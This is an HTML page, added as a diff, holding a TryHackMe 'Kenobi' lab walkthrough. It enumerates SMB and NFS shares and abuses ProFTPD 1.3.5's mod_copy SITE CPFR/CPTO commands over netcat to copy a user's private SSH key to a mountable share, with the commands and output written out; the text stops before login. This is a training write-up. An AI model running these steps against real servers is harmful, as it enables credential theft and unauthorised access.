@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.142.0">
+    <meta name="generator" content="Relearn 5.22.1+tip">
+    <meta name="description" content="Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.">
+    <meta name="author" content="">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/walkthroughs/kenobi/kenobi.png">
+  <meta name="twitter:title" content="Kenobi - TryHackMe">
+  <meta name="twitter:description" content="Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation."><meta property="og:url" content="http://localhost:1313/walkthroughs/kenobi/">
+  <meta property="og:site_name" content="H1roBytes">
+  <meta property="og:title" content="Kenobi - TryHackMe">
+  <meta property="og:description" content="Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="website">
+    <meta property="og:image" content="http://localhost:1313/walkthroughs/kenobi/kenobi.png">
+    <title>Kenobi - TryHackMe - H1roBytes</title>
+    <link href="/walkthroughs/kenobi/index.xml" rel="alternate" type="application/rss+xml" title="Kenobi - TryHackMe - H1roBytes">
+    <link href="/images/logo.png?1738202701" rel="icon" type="image/png">
+    <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
+    <link href="/css/fontawesome-all.min.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1738202701" rel="stylesheet">
+    <link href="/css/auto-complete.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1738202701" rel="stylesheet">
+    <link href="/css/fonts.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1738202701" rel="stylesheet">
+    <link href="/css/theme-relearn-dark.css?1738202701" rel="stylesheet" id="R-variant-style">
+    <link href="/css/variant.css?1738202701" rel="stylesheet">
+    <link href="/css/print.css?1738202701" rel="stylesheet" media="print">
+    <link href="/css/ie.css?1738202701" rel="stylesheet">
+    <script src="/js/url.js?1738202701"></script>
+    <script src="/js/variant.js?1738202701"></script>
+    <script>
+      // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
+      // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
+      window.index_js_url="/index.search.js";
+      var root_url="/";
+      var baseUri=root_url.replace(/\/$/, '');
+      // translations
+      window.T_Copy_to_clipboard = 'Copy to clipboard';
+      window.T_Copied_to_clipboard = 'Copied to clipboard!';
+      window.T_Copy_link_to_clipboard = 'Copy link to clipboard';
+      window.T_Link_copied_to_clipboard = 'Copied link to clipboard!';
+      window.T_Reset_view = 'Reset view';
+      window.T_View_reset = 'View reset!';
+      window.T_No_results_found = 'No results found for \u0022{0}\u0022';
+      window.T_N_results_found = '{1} results found for \u0022{0}\u0022';
+      // some further base stuff
+      var baseUriFull='http:\/\/localhost:1313/';
+      window.variants && variants.init( [ 'relearn-dark', 'zen-dark', 'relearn-bright', 'relearn-light', 'zen-light', 'neon', 'learn', 'blue', 'green', 'red' ] );
+    </script>
+  </head>
+  <body class="mobile-support html" data-url="/walkthroughs/kenobi/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar">
+        <div class="topbar-wrapper">
+          <div class="topbar-sidebar-divider"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
+              <button class="topbar-control" onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)">
+                <i class="fa-fw fas fa-bars"></i>
+              </button>
+            </div>
+            <div class="topbar-button topbar-button-toc" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+              <button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)">
+                <i class="fa-fw fas fa-list-alt"></i>
+              </button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper"><nav class="TableOfContents">
+  <ul>
+    <li><a href="#task-1-deploying-the-vulnerable-machine">Task 1: Deploying the Vulnerable Machine</a></li>
+    <li><a href="#task-2-enumerating-samba-for-shares">Task 2: Enumerating Samba for Shares</a></li>
+    <li><a href="#task-3-gain-initial-access-with-proftpd">Task 3: Gain Initial Access with ProFtpd</a></li>
+    <li><a href="#task-4-privilege-escalation-with-path-variable-manipulation">Task 4: Privilege Escalation with Path Variable Manipulation</a></li>
+  </ul>
+</nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <span class="topbar-breadcrumbs highlightable">
+            Kenobi - TryHackMe
+          </span>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-more" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+              <button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="More">
+                <i class="fa-fw fas fa-ellipsis-v"></i>
+              </button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable default" tabindex="-1">
+        <div class="flex-block-wrapper">
+          <article class="default">
+            <header class="headline">
+<div class=" taxonomy-tags term-list cstyle  tags" title="Tags" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
+  <ul>
+    <li><a class="term-link" href="/tags/proftpd/index.html">Proftpd</a></li>
+    <li><a class="term-link" href="/tags/samba/index.html">Samba</a></li>
+    <li><a class="term-link" href="/tags/suid-binary/index.html">SUID Binary</a></li>
+    <li><a class="term-link" href="/tags/tryhackme/index.html">TryHackMe</a></li>
+  </ul>
+</div>
+            </header>
+<h1 id="kenobi---tryhackme">Kenobi - TryHackMe</h1>
+
+<p>Date written: November 2023    <br>
+Date published: November 2023</p>
+<p><a href="#R-image-097d472f00e5883d37b20fba5299924b" class="lightbox-link"><img src="/walkthroughs/kenobi/kenobi.png" alt="KenobiLogo" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-097d472f00e5883d37b20fba5299924b"><img src="/walkthroughs/kenobi/kenobi.png" alt="KenobiLogo" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<h2 id="task-1-deploying-the-vulnerable-machine">Task 1: Deploying the Vulnerable Machine</h2>
+<p>This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.</p>
+<p>The first step to any TryHackMe machine is to actually deploy the machine by either connecting to OpenVPN or by using AttackBox. For this machines I chose AttackBox.</p>
+<blockquote>
+<p>Make sure you&rsquo;re connected to our network and deploy the machine.</p>
+</blockquote>
+<blockquote>
+<p>No answer needed!</p>
+</blockquote>
+<p>Next I did a standard NMAP scan on the machine.</p>
+<p><code>nmap 10.10.2.251</code></p>
+<p>Once the scan completed I could see there were seven open ports.</p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> ip-10-10-2-251.eu-west-1.compute.internal <span style="color:#f92672">(</span>10.10.2.251<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00063s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">993</span> closed ports
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>21/tcp   open  ftp
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>111/tcp  open  rpcbind
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>2049/tcp open  nfs
+</span></span><span style="display:flex;"><span>MAC Address: 02:55:B9:EF:01:D9 <span style="color:#f92672">(</span>Unknown<span style="color:#f92672">)</span></span></span></code></pre></div><p><a href="#R-image-d47769baaadcde649f5d5bcc0a495a98" class="lightbox-link"><img src="/walkthroughs/kenobi/task1_NMAP.png" alt="NMAP" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-d47769baaadcde649f5d5bcc0a495a98"><img src="/walkthroughs/kenobi/task1_NMAP.png" alt="NMAP" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<blockquote>
+<p>Scan the machine with nmap, how many ports are open?</p>
+</blockquote>
+<blockquote>
+<p>Answer: 7</p>
+</blockquote>
+<h2 id="task-2-enumerating-samba-for-shares">Task 2: Enumerating Samba for Shares</h2>
+<p>&ldquo;Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.</p>
+<p>Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.&rdquo; - 
+<a href="https://tryhackme.com/room/kenobi" target="_blank">TryHackMe</a></p>
+<p>In the next task is all about SMB and enumerating it&rsquo;s shares with NAMP.</p>
+<p>The script that I used to enumerate SMB shares was smb-enum-shares and smb-enum-users on port 445. SMB has two ports, 445 and 139.</p>
+<p>
+<a href="https://nmap.org/nsedoc/scripts/smb-enum-shares.html" target="_blank">smb-enum-shares</a> will enumerate the SMB shares.</p>
+<p>
+<a href="https://nmap.org/nsedoc/scripts/smb-enum-users.html" target="_blank">smb-enum-users</a> will enumerate the SMB users.</p>
+<p><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.2.251</code></p>
+<p><a href="#R-image-4980ef86de190946d40e14d73ef0ef9d" class="lightbox-link"><img src="/walkthroughs/kenobi/task2_enum.png" alt="Enumeration" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-4980ef86de190946d40e14d73ef0ef9d"><img src="/walkthroughs/kenobi/task2_enum.png" alt="Enumeration" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>MAC Address: 02:55:B9:EF:01:D9 <span style="color:#f92672">(</span>Unknown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb-enum-shares: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">\\</span>10.10.2.251<span style="color:#ae81ff">\I</span>PC$: 
+</span></span><span style="display:flex;"><span>|     Type: STYPE_IPC_HIDDEN
+</span></span><span style="display:flex;"><span>|     Comment: IPC Service <span style="color:#f92672">(</span>kenobi server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|     Users: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>|     Max Users: &lt;unlimited&gt;
+</span></span><span style="display:flex;"><span>|     Path: C:<span style="color:#ae81ff">\t</span>mp
+</span></span><span style="display:flex;"><span>|     Anonymous access: READ/WRITE
+</span></span><span style="display:flex;"><span>|     Current user access: READ/WRITE
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">\\</span>10.10.2.251<span style="color:#ae81ff">\a</span>nonymous: 
+</span></span><span style="display:flex;"><span>|     Type: STYPE_DISKTREE
+</span></span><span style="display:flex;"><span>|     Comment: 
+</span></span><span style="display:flex;"><span>|     Users: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     Max Users: &lt;unlimited&gt;
+</span></span><span style="display:flex;"><span>|     Path: C:<span style="color:#ae81ff">\h</span>ome<span style="color:#ae81ff">\k</span>enobi<span style="color:#ae81ff">\s</span>hare
+</span></span><span style="display:flex;"><span>|     Anonymous access: READ/WRITE
+</span></span><span style="display:flex;"><span>|     Current user access: READ/WRITE
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">\\</span>10.10.2.251<span style="color:#ae81ff">\p</span>rint$: 
+</span></span><span style="display:flex;"><span>|     Type: STYPE_DISKTREE
+</span></span><span style="display:flex;"><span>|     Comment: Printer Drivers
+</span></span><span style="display:flex;"><span>|     Users: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     Max Users: &lt;unlimited&gt;
+</span></span><span style="display:flex;"><span>|     Path: C:<span style="color:#ae81ff">\v</span>ar<span style="color:#ae81ff">\l</span>ib<span style="color:#ae81ff">\s</span>amba<span style="color:#ae81ff">\p</span>rinters
+</span></span><span style="display:flex;"><span>|     Anonymous access: &lt;none&gt;
+</span></span><span style="display:flex;"><span>|_    Current user access: &lt;none&gt;</span></span></code></pre></div><p>After enumerating the shares and the users I found that there are three shares available - IPC$, anonymous, and printers</p>
+<blockquote>
+<p>Using the nmap command above, how many shares have been found?</p>
+</blockquote>
+<blockquote>
+<p>Answer: 3</p>
+</blockquote>
+<p>Next I tried to log into the share with <strong>smbclient</strong> as <strong>anonymous</strong> and no password.</p>
+<p><code>smbclient //10.10.2.251/anonymous</code></p>
+<p><a href="#R-image-7a075068f1dcc0721c39ac0f958f9523" class="lightbox-link"><img src="/walkthroughs/kenobi/task2_smbAnon.png" alt="smbLogin" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-7a075068f1dcc0721c39ac0f958f9523"><img src="/walkthroughs/kenobi/task2_smbAnon.png" alt="smbLogin" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Once I was logged in I ran <code>ls</code> to see what files the user has access to. Not running any flags with ls will cause an error.</p>
+<p><a href="#R-image-cbb51d88a67e02e5eba796fcde8a6229" class="lightbox-link"><img src="/walkthroughs/kenobi/task2_log.png" alt="filels" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-cbb51d88a67e02e5eba796fcde8a6229"><img src="/walkthroughs/kenobi/task2_log.png" alt="filels" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<blockquote>
+<p>Once you&rsquo;re connected, list the files on the share. What is the file can you see?</p>
+</blockquote>
+<blockquote>
+<p>Answer: log.txt</p>
+</blockquote>
+<p>Once I knew what was on the share I closed out of smb share connection and downloaded the log file with <code>smbget -R smb://10.10.2.251/anonymous</code></p>
+<p>After a successful download I opened the file in nano to read it contents. This can also be done via <code>cat</code> or your favorite text editor (vim, gedit, etc).</p>
+<p>I see that the server is running ProFTPD on port 21. There is also quite a bit of other useful information in this file that I would take note of if this were a real pentest, like the public SSH key or the authentication information.</p>
+<blockquote>
+<p>What port is FTP running on?</p>
+</blockquote>
+<blockquote>
+<p>Answer: 21</p>
+</blockquote>
+<p>Next I pivoted back to my NMAP results to see that RPCbind is running on port 111. I can use this to enumerate the network file system.</p>
+<p>Running the scripts nfs-ls,nfs-statfs,nfs-showmount (look up scripts)</p>
+<p>
+<a href="https://nmap.org/nsedoc/scripts/nfs-ls.html" target="_blank">nfs-ls</a> attempts to get useful inforamtion from an SMB share with the output resembling the <code>ls</code> command.</p>
+<p>
+<a href="https://nmap.org/nsedoc/scripts/nfs-statfs.html" target="_blank">nfs-statfs</a> attempts to get disk space information from the SMB share with the output resembling the <code>df</code> command.</p>
+<p>
+<a href="https://nmap.org/nsedoc/scripts/nfs-showmount.html" target="_blank">nfs-showmount</a> shows mount information like the <code>showmount -e</code> command.</p>
+<p><code>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.2.251</code></p>
+<p><a href="#R-image-7d86e5b85dc72a36c2c2d0633625c3c2" class="lightbox-link"><img src="/walkthroughs/kenobi/task2_mount.png" alt="MountScanNMAP" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-7d86e5b85dc72a36c2c2d0633625c3c2"><img src="/walkthroughs/kenobi/task2_mount.png" alt="MountScanNMAP" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>111/tcp open  rpcbind
+</span></span><span style="display:flex;"><span>| nfs-ls: Volume /var
+</span></span><span style="display:flex;"><span>|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
+</span></span><span style="display:flex;"><span>| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
+</span></span><span style="display:flex;"><span>| rwxr-xr-x   <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">4096</span>  2019-09-04T08:53:24  .
+</span></span><span style="display:flex;"><span>| rwxr-xr-x   <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">4096</span>  2019-09-04T12:27:33  ..
+</span></span><span style="display:flex;"><span>| rwxr-xr-x   <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">4096</span>  2019-09-04T12:09:49  backups
+</span></span><span style="display:flex;"><span>| rwxr-xr-x   <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">4096</span>  2019-09-04T10:37:44  cache
+</span></span><span style="display:flex;"><span>| rwxrwxrwt   <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">4096</span>  2019-09-04T08:43:56  crash
+</span></span><span style="display:flex;"><span>| rwxrwsr-x   <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">50</span>   <span style="color:#ae81ff">4096</span>  2016-04-12T20:14:23  local
+</span></span><span style="display:flex;"><span>| rwxrwxrwx   <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">9</span>     2019-09-04T08:41:33  lock
+</span></span><span style="display:flex;"><span>| rwxrwxr-x   <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">108</span>  <span style="color:#ae81ff">4096</span>  2019-09-04T10:37:44  log
+</span></span><span style="display:flex;"><span>| rwxr-xr-x   <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">4096</span>  2019-01-29T23:27:41  snap
+</span></span><span style="display:flex;"><span>| rwxr-xr-x   <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">4096</span>  2019-09-04T08:53:24  www
+</span></span><span style="display:flex;"><span>|_
+</span></span><span style="display:flex;"><span>| nfs-showmount: 
+</span></span><span style="display:flex;"><span>|_  /var *
+</span></span><span style="display:flex;"><span>| nfs-statfs: 
+</span></span><span style="display:flex;"><span>|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
+</span></span><span style="display:flex;"><span>|_  /var        9204224.0  1836536.0  6877092.0  22%   16.0T        <span style="color:#ae81ff">32000</span>
+</span></span><span style="display:flex;"><span>MAC Address: 02:B9:E3:41:0F:B9 <span style="color:#f92672">(</span>Unknown<span style="color:#f92672">)</span></span></span></code></pre></div><blockquote>
+<p>What mount can we see?</p>
+</blockquote>
+<blockquote>
+<p>Answer: /var</p>
+</blockquote>
+<h2 id="task-3-gain-initial-access-with-proftpd">Task 3: Gain Initial Access with ProFtpd</h2>
+<p>&ldquo;ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.&rdquo; - 
+<a href="https://tryhackme.com/room/kenobi" target="_blank">TryHackMe</a></p>
+<p>I start off with a NetCat 
+<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp#enumeration" target="_blank">banner grab</a>.</p>
+<p><a href="#R-image-5cd2e2210b09e19678bb10f2e5bf2d98" class="lightbox-link"><img src="/walkthroughs/kenobi/task3_NCBanner.png" alt="BannerGrab" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-5cd2e2210b09e19678bb10f2e5bf2d98"><img src="/walkthroughs/kenobi/task3_NCBanner.png" alt="BannerGrab" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ip-10-10-44-242:~# nc -vn 10.10.48.208 <span style="color:#ae81ff">21</span>
+</span></span><span style="display:flex;"><span>Connection to 10.10.48.208 <span style="color:#ae81ff">21</span> port <span style="color:#f92672">[</span>tcp/*<span style="color:#f92672">]</span> succeeded!
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> ProFTPD 1.3.5 Server <span style="color:#f92672">(</span>ProFTPD Default Installation<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.48.208<span style="color:#f92672">]</span></span></span></code></pre></div><blockquote>
+<p>Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version?</p>
+</blockquote>
+<blockquote>
+<p>Answer: 1.3.5</p>
+</blockquote>
+<p>Now that I know the version of the software I can move to 
+<a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/search-exploits" target="_blank">Searchsploit</a> to see if there are any known exploits for this version of ProFTPD. This can be done in the terminal or in your 
+<a href="https://www.exploit-db.com/search" target="_blank">browser</a> which ever you are comfortable with, but I personally prefer the terminal.</p>
+<p>Using specific terms will help narrow down Searchsploit results, but it can also hinder them. So I am always carful to start a wide search and then narrow it down to a more specific version or exploit type.</p>
+<p><a href="#R-image-36ad7e6fa32b4d10c601cd349da880f8" class="lightbox-link"><img src="/walkthroughs/kenobi/task3_Search.png" alt="Searchsploit" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-36ad7e6fa32b4d10c601cd349da880f8"><img src="/walkthroughs/kenobi/task3_Search.png" alt="Searchsploit" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<blockquote>
+<p>How many exploits are there for the ProFTPd running?</p>
+</blockquote>
+<blockquote>
+<p>Answer: 4</p>
+</blockquote>
+<p>After finding which exploit to use I navigate to the file path provided in Searchsploit, read the exploit, and make sure it will fit my needs. In this case it does, but it is a little too indepth. So I use what the exploit is doing and apply it to my needs. Typically I would 
+<a href="https://www.freecodecamp.org/news/the-linux-cp-command-how-to-copy-files-in-linux/" target="_blank">copy</a> the exploit to a new file, but in this case I don&rsquo;t need a separate exploit file at all.</p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ip-10-10-44-242:~# searchsploit -p <span style="color:#ae81ff">37262</span>
+</span></span><span style="display:flex;"><span>  Exploit: ProFTPd 1.3.5 - <span style="color:#e6db74">&#39;mod_copy&#39;</span> Command Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/37262
+</span></span><span style="display:flex;"><span>     Path: /opt/exploitdb/exploits/linux/remote/37262.rb
+</span></span><span style="display:flex;"><span>    Codes: CVE-2015-3306, OSVDB-120834
+</span></span><span style="display:flex;"><span> Verified: True
+</span></span><span style="display:flex;"><span>File Type: Ruby script, ASCII text</span></span></code></pre></div><div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp /opt/exploitdb/exploits/linux/remote/37262.rb ~/Desktop</span></span></code></pre></div><p>Reading the ProFTPD page for the 
+<a href="http://www.proftpd.org/docs/contrib/mod_copy.html" target="_blank">mod_copy module</a>. I see that I can use the commands SITE CPFR and SITE CPTO to copy Kenobi&rsquo;s  private ssh key to my tmp directory.</p>
+<p><a href="#R-image-ebfe56e7e39ecef97285cb6c548e1e1b" class="lightbox-link"><img src="/walkthroughs/kenobi/task3_NCExploit.png" alt="NetCatCopy" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-ebfe56e7e39ecef97285cb6c548e1e1b"><img src="/walkthroughs/kenobi/task3_NCExploit.png" alt="NetCatCopy" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<blockquote>
+<p>We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.</p>
+</blockquote>
+<blockquote>
+<p>Answer: No answer needed</p>
+</blockquote>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ip-10-10-184-203:~# nc 10.10.48.208 <span style="color:#ae81ff">21</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> ProFTPD 1.3.5 Server <span style="color:#f92672">(</span>ProFTPD Default Installation<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.48.208<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>SITE CPFR /home/kenobi/.ssh/id_rsa
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">350</span> File or directory exists, ready <span style="color:#66d9ef">for</span> destination name
+</span></span><span style="display:flex;"><span>SITE CPTO /var/tmp/id_rsa
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> Copy successful</span></span></code></pre></div><blockquote>
+<p>We knew that the /var directory was a mount we could see (task 2, question 4). So we&rsquo;ve now moved Kenobi&rsquo;s private key to the /var/tmp directory.</p>
+</blockquote>
+<blockquote>
+<p>Answer: No answer needed</p>
+</blockquote>
+<p>After copying the directory I mount it to my machine with:</p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ip-10-10-184-203:~/Downloads# mkdir /mnt/kenobiNFS
+</span></span><span style="display:flex;"><span>root@ip-10-10-184-203:~/Downloads# mount 10.10.48.208:/var /mnt/kenobiNFS</span></span></code></pre></div><p>Once mounted running an <code>ls -lsa /mnt/kenobiNFS</code> command will output the contents of the directory.</p>
+<p><a href="#R-image-cd9a5956235f90884a8c56013a788360" class="lightbox-link"><img src="/walkthroughs/kenobi/task3_mount.png" alt="lsMount" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-cd9a5956235f90884a8c56013a788360"><img src="/walkthroughs/kenobi/task3_mount.png" alt="lsMount" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Now I know we have the ssh key so all I have to do is copy the value to my local folder.</p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp /mnt/kenobiNFS/tmp/id_rsa .</span></span></code></pre></div><p>Adding a period or decimal in place of the destination will copy the file to the current working directory. After copying the value I set the permissions to read and write.</p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo chmod <span style="color:#ae81ff">600</span> id_rsa</span></span></code></pre></div><p>Once that is done all that&rsquo;s left to do is log in as Kenobi.</p>
